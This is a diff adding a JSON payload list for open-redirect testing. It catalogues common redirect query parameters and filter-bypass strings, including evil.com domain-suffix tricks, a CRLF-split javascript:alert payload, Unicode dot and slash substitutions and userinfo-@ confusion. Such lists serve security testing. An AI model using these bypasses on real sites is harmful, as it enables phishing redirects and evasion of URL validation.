@@ -1,0 +1,335 @@
+[
+  {
+    "id": "open-redirect-1",
+    "title": "Methodology",
+    "payload": "https://example.com/redirect?url=https://userpreferredsite.com",
+    "context": "Methodology",
+    "tags": [
+      "open-redirect"
+    ]
+  },
+  {
+    "id": "open-redirect-2",
+    "title": "JavaScript-based Redirects",
+    "payload": "window.location = redirectTo;",
+    "context": "JavaScript-based Redirects",
+    "tags": [
+      "open-redirect"
+    ]
+  },
+  {
+    "id": "open-redirect-3",
+    "title": "Common Query Parameters",
+    "payload": "?checkout_url={payload}",
+    "context": "Common Query Parameters",
+    "tags": [
+      "open-redirect"
+    ]
+  },
+  {
+    "id": "open-redirect-4",
+    "title": "Common Query Parameters",
+    "payload": "?continue={payload}",
+    "context": "Common Query Parameters",
+    "tags": [
+      "open-redirect"
+    ]
+  },
+  {
+    "id": "open-redirect-5",
+    "title": "Common Query Parameters",
+    "payload": "?dest={payload}",
+    "context": "Common Query Parameters",
+    "tags": [
+      "open-redirect"
+    ]
+  },
+  {
+    "id": "open-redirect-6",
+    "title": "Common Query Parameters",
+    "payload": "?destination={payload}",
+    "context": "Common Query Parameters",
+    "tags": [
+      "open-redirect"
+    ]
+  },
+  {
+    "id": "open-redirect-7",
+    "title": "Common Query Parameters",
+    "payload": "?go={payload}",
+    "context": "Common Query Parameters",
+    "tags": [
+      "open-redirect"
+    ]
+  },
+  {
+    "id": "open-redirect-8",
+    "title": "Common Query Parameters",
+    "payload": "?image_url={payload}",
+    "context": "Common Query Parameters",
+    "tags": [
+      "open-redirect"
+    ]
+  },
+  {
+    "id": "open-redirect-9",
+    "title": "Common Query Parameters",
+    "payload": "?next={payload}",
+    "context": "Common Query Parameters",
+    "tags": [
+      "open-redirect"
+    ]
+  },
+  {
+    "id": "open-redirect-10",
+    "title": "Common Query Parameters",
+    "payload": "?redir={payload}",
+    "context": "Common Query Parameters",
+    "tags": [
+      "open-redirect"
+    ]
+  },
+  {
+    "id": "open-redirect-11",
+    "title": "Common Query Parameters",
+    "payload": "?redirect_uri={payload}",
+    "context": "Common Query Parameters",
+    "tags": [
+      "open-redirect"
+    ]
+  },
+  {
+    "id": "open-redirect-12",
+    "title": "Common Query Parameters",
+    "payload": "?redirect_url={payload}",
+    "context": "Common Query Parameters",
+    "tags": [
+      "open-redirect"
+    ]
+  },
+  {
+    "id": "open-redirect-13",
+    "title": "Common Query Parameters",
+    "payload": "?redirect={payload}",
+    "context": "Common Query Parameters",
+    "tags": [
+      "open-redirect"
+    ]
+  },
+  {
+    "id": "open-redirect-14",
+    "title": "Common Query Parameters",
+    "payload": "?return_path={payload}",
+    "context": "Common Query Parameters",
+    "tags": [
+      "open-redirect"
+    ]
+  },
+  {
+    "id": "open-redirect-15",
+    "title": "Common Query Parameters",
+    "payload": "?return_to={payload}",
+    "context": "Common Query Parameters",
+    "tags": [
+      "open-redirect"
+    ]
+  },
+  {
+    "id": "open-redirect-16",
+    "title": "Common Query Parameters",
+    "payload": "?return={payload}",
+    "context": "Common Query Parameters",
+    "tags": [
+      "open-redirect"
+    ]
+  },
+  {
+    "id": "open-redirect-17",
+    "title": "Common Query Parameters",
+    "payload": "?returnTo={payload}",
+    "context": "Common Query Parameters",
+    "tags": [
+      "open-redirect"
+    ]
+  },
+  {
+    "id": "open-redirect-18",
+    "title": "Common Query Parameters",
+    "payload": "?rurl={payload}",
+    "context": "Common Query Parameters",
+    "tags": [
+      "open-redirect"
+    ]
+  },
+  {
+    "id": "open-redirect-19",
+    "title": "Common Query Parameters",
+    "payload": "?target={payload}",
+    "context": "Common Query Parameters",
+    "tags": [
+      "open-redirect"
+    ]
+  },
+  {
+    "id": "open-redirect-20",
+    "title": "Common Query Parameters",
+    "payload": "?url={payload}",
+    "context": "Common Query Parameters",
+    "tags": [
+      "open-redirect"
+    ]
+  },
+  {
+    "id": "open-redirect-21",
+    "title": "Common Query Parameters",
+    "payload": "?view={payload}",
+    "context": "Common Query Parameters",
+    "tags": [
+      "open-redirect"
+    ]
+  },
+  {
+    "id": "open-redirect-22",
+    "title": "Common Query Parameters",
+    "payload": "/{payload}",
+    "context": "Common Query Parameters",
+    "tags": [
+      "open-redirect"
+    ]
+  },
+  {
+    "id": "open-redirect-23",
+    "title": "Common Query Parameters",
+    "payload": "/redirect/{payload}",
+    "context": "Common Query Parameters",
+    "tags": [
+      "open-redirect"
+    ]
+  },
+  {
+    "id": "open-redirect-24",
+    "title": "Filter Bypass",
+    "payload": "www.whitelisted.com.evil.com redirect to evil.com",
+    "context": "Filter Bypass",
+    "tags": [
+      "open-redirect"
+    ]
+  },
+  {
+    "id": "open-redirect-25",
+    "title": "Filter Bypass",
+    "payload": "java%0d%0ascript%0d%0a:alert(0)",
+    "context": "Filter Bypass",
+    "tags": [
+      "open-redirect"
+    ]
+  },
+  {
+    "id": "open-redirect-26",
+    "title": "Filter Bypass",
+    "payload": "https:google.com",
+    "context": "Filter Bypass",
+    "tags": [
+      "open-redirect"
+    ]
+  },
+  {
+    "id": "open-redirect-27",
+    "title": "Filter Bypass",
+    "payload": "\\/\\/google.com/",
+    "context": "Filter Bypass",
+    "tags": [
+      "open-redirect"
+    ]
+  },
+  {
+    "id": "open-redirect-28",
+    "title": "Filter Bypass",
+    "payload": "/\\/google.com/",
+    "context": "Filter Bypass",
+    "tags": [
+      "open-redirect"
+    ]
+  },
+  {
+    "id": "open-redirect-29",
+    "title": "Filter Bypass",
+    "payload": "/?redir=google。com",
+    "context": "Filter Bypass",
+    "tags": [
+      "open-redirect"
+    ]
+  },
+  {
+    "id": "open-redirect-30",
+    "title": "Filter Bypass",
+    "payload": "?next=whitelisted.com&next=google.com",
+    "context": "Filter Bypass",
+    "tags": [
+      "open-redirect"
+    ]
+  },
+  {
+    "id": "open-redirect-31",
+    "title": "Filter Bypass",
+    "payload": "http://www.theirsite.com@yoursite.com/",
+    "context": "Filter Bypass",
+    "tags": [
+      "open-redirect"
+    ]
+  },
+  {
+    "id": "open-redirect-32",
+    "title": "Filter Bypass",
+    "payload": "http://www.yoursite.com/http://www.theirsite.com/",
+    "context": "Filter Bypass",
+    "tags": [
+      "open-redirect"
+    ]
+  },
+  {
+    "id": "open-redirect-33",
+    "title": "Filter Bypass",
+    "payload": "http://www.yoursite.com/folder/www.folder.com",
+    "context": "Filter Bypass",
+    "tags": [
+      "open-redirect"
+    ]
+  },
+  {
+    "id": "open-redirect-34",
+    "title": "Filter Bypass",
+    "payload": "http://www.yoursite.com?http://www.theirsite.com/",
+    "context": "Filter Bypass",
+    "tags": [
+      "open-redirect"
+    ]
+  },
+  {
+    "id": "open-redirect-35",
+    "title": "Filter Bypass",
+    "payload": "http://www.yoursite.com?folder/www.folder.com",
+    "context": "Filter Bypass",
+    "tags": [
+      "open-redirect"
+    ]
+  },
+  {
+    "id": "open-redirect-36",
+    "title": "Filter Bypass",
+    "payload": "https://evil.c℀.example.com . ---> https://evil.ca/c.example.com",
+    "context": "Filter Bypass",
+    "tags": [
+      "open-redirect"
+    ]
+  },
+  {
+    "id": "open-redirect-37",
+    "title": "Filter Bypass",
+    "payload": "http://a.com／X.b.com",
+    "context": "Filter Bypass",
+    "tags": [
+      "open-redirect"
+    ]
+  }
+]
